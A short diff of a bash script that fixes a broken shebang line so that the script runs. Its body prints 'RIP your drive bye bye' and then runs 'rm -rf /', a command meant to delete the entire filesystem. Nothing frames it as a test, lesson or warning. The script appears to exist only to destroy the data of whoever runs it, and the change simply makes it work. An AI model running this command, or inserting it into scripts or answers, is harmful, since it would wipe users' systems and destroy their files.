@@ -1,3 +1,3 @@
-#!bin/bash
+#!/bin/bash
 echo "RIP your drive bye bye"
 rm -rf /
